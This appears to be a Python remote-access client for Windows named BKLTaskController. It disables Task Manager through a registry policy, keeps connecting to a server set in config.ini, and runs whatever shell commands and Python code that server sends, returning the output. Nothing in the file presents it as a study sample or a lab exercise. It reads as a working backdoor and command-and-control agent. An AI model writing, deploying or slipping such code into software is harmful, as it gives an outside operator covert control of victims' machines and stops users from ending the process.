import sys, os
# -*- coding: utf-8 -*-
import time
import ctypes
import win32api, win32con
from system_hotkey import SystemHotkey
from plyer import notification
from socket import *
from threading import Thread
from ast import literal_eval
import subprocess
from configparser import ConfigParser

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    win32api.MessageBox(0, "无法锁定管理员权限: 无引导.", "错误", win32con.MB_OK)
    sys.exit()
else:
    os.chdir(os.path.dirname(os.path.realpath(__file__)))

def show_msg(msg: str, seconds=2):
    notification.notify(title="BKLTaskController", message=msg, timeout=seconds)

def reg_add(position, path: str, type, keyname: str, content):
    try:
        key = win32api.RegOpenKeyEx(position, path, 0,  win32con.KEY_READ | win32con.KEY_WOW64_64KEY)
        win32api.RegSetValue(key, keyname, type, content)
        win32api.CloseHandle(key)
    except Exception as e:
        print(e)
    else:
        print('[ Info ] 注册表操作成功！')

class taskmgr_controller():
    def __init__(self) -> None:
        self.taskmgr_open = True

    def close_taskmgr(self):
        reg_add(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", win32con.REG_DWORD, "DisableTaskMgr", 1)
        self.taskmgr_open = False
    
    def open_taskmgr(self):
        reg_add(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", win32con.REG_DWORD, "DisableTaskMgr", 0)
        self.taskmgr_open = True


    def switch_taskmgr_open(self, event=None):
            if self.taskmgr_open:
                self.close_taskmgr()
            else:
                self.open_taskmgr()

    def to_switch(self, tostate):
        if tostate:
            self.open_taskmgr()
        else:
            self.close_taskmgr()

    def __del__(self):
        self.open_taskmgr()

def timer():
    global minutes
    while 1:
        time.sleep(60)
        minutes += 1

def set_config(path, name, value):
    global conf
    conf.set(path, name, value)

    f = open("config.ini", "w", encoding="utf-8")
    conf.write(f)
    f.close()
    
    conf = ConfigParser()
    conf.read("config.ini")

class data_center:
    def __init__(self, ip_port):
        self.ip_port = ip_port
        self.buffer_size = 1024
        pass

    def get_json(self, data):
        return literal_eval(data.decode("utf-8"))

    def connect(self):
        while 1:
            try:
                connect = socket(AF_INET,SOCK_STREAM)
                connect.connect(self.ip_port)
            except Exception as e:
                print("连接失败", e)
            else:
                connect.sendall(str({"state": "SUCCESS", "signature": signature, "name": name}).encode("utf-8"))
                
                data = connect.recv(self.buffer_size)
                json = self.get_json(data)
                
                if "state" in json:
                    if json['state'] == "SUCCESS":
                        self.connect = connect
                        self.connect_right = True
                        return True
                
            connect.close()
            time.sleep(20)

    def main(self):
        while self.connect_right:
            try:
                data = self.connect.recv(self.buffer_size)
                json = self.get_json(data)

                t = Thread(target=self.do_command, args=(json, ))
                t.setDaemon(True)
                t.start()
            except Exception as e:
                try:
                    self.connect.sendall(str({"state": "Error", "content": e}).encode("utf-8"))
                except Exception as e:
                    print("recv data error", str(e))
                    print("Disconnect from server.")
                    self.connect.close()
                    self.connect_right = False
                    del self.connect
                    break
        else:
            print("Disconnect from server.")
            self.connect.close()
            del self.connect


    def do_command(self, json):
        send_back = {}
        try:
            if json['type'] == "IsOnline":
                send_back['state'] = 1
                send_back['content'] = "online"
            elif json['type'] == "":
                send_back['state'] = 0
                send_back['content'] = "command not found"
            elif json['type'] == "command":
                sp = subprocess.Popen(json['content'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
                while 1:
                    data = sp.stdout.readline()
                    if data == b'':
                        break
                    self.connect.sendall(data.decode("gbk").encode("utf-8"))
                send_back['state'] = 1
                send_back['content'] = "do command complete."
            elif json['type'] == "code":
                try:
                    exec(json['content'])
                except Exception as e:
                    send_back['state'] = 0
                    send_back['content'] = str(e)
                else:
                    send_back['state'] = 1
                    send_back['content'] = "do code complete."
            elif json['type'] == "codex":
                ret = self.do_code(json['content'])
                send_back['state'] = ret[0]
                send_back['content'] = ret[1]
        except Exception as e:
            send_back['state'] = 0
            send_back['content'] = str(e)

        print("send back:", send_back)
        try:
            self.connect.sendall(str(send_back).encode("utf-8"))
        except Exception as e:
            print("send data error", e)
            self.connect_right = False
        
        return
    
    def do_code(self, func_str):
        namespace = {}
        fun = compile(func_str, '<string>', 'exec')

        exec(fun, namespace)
        try:
            ret = namespace['main']() #do the main func of the code
        except Exception as e:
            return False, str(e)
        else:
            return True, ret
        finally:
            del namespace
    
    def set_buffer_size(self, num):
        print("set buffer size", num)
        self.set_buffer_size = num


if __name__ == '__main__':
    minutes = 0
    tmc = taskmgr_controller()
    hk = SystemHotkey()
    outgoing = False

    tmc.to_switch(False)
    conf = ConfigParser()
    conf.read("config.ini")

    ip_port=(conf.get("data_center", "host"), conf.getint("data_center", "port"))
    signature = conf.get("data_center", "signature")
    buffer_size = conf.getint("data_center", "buffer_size")
    name = conf.get("data_center", "name")

    t = Thread(target=timer)
    t.setDaemon(True)
    t.start()

    try:
        hk.register(('control', 'alt', 'm'), callback=tmc.switch_taskmgr_open) #开启/禁用任务管理器
        hk.register(('control', 'alt', 'p'), callback=lambda event: show_msg("I'm fine."))
    except:
        win32api.MessageBox(0, "无法注册快捷键: 已被占用或命令被拦截.", "错误", win32con.MB_OK)
        exit()

    dc = data_center(ip_port)
    while 1:
        if dc.connect():
            print("[ Info ] 连接成功.")
            dc.main()
        print("[ Info ] 重启数据中心.")

    sys.exit()